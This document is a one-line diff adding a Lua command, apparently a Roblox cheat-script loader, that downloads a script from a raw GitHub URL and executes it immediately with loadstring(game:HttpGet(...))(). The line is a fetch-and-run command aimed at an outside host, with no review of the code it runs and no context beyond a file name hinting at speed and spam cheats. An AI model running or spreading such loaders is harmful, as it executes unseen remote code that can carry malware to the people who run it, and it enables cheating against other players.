@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/1-speed-keyboard-escape-candy-chocolate-spam5-13afifoiof4k3q.lua"))()
